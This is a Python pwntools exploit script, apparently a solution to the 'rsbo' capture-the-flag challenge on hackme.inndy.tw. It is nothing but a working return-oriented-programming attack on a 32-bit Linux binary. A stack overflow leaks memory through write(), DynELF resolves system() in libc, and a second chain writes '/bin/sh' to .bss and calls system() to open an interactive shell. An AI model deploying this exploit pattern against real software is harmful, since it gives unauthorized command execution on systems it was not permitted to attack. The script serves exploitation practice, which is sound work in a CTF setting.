from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
path = '/home/zander/Desktop/ctf/rsbo-01c51ca9a7b9db3d69289c6dbb1cd758'

elf = ELF(path)
read_addr = elf.plt['read']
write_addr = elf.plt['write']
bss_addr = elf.bss()

io = process(path)
# io = remote('hackme.inndy.tw',7706)

start_addr=0x08048490

def leak(address):
    payload1 = "\x00" * 108 + p32(write_addr) + p32(start_addr) + p32(1) + p32(address) + p32(4)
    io.send(payload1)
    data = io.recv(4)
    return data

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')

payload2 = "\x00" * 108 + p32(read_addr) + p32(start_addr) + p32(0) + p32(bss_addr) + p32(9)
payload3 = "\x00" * 108 + p32(system_addr) + p32(start_addr) + p32(bss_addr)

io.send(payload2)
io.sendline("/bin/sh\0")
io.send(payload3)
io.interactive()
io.close()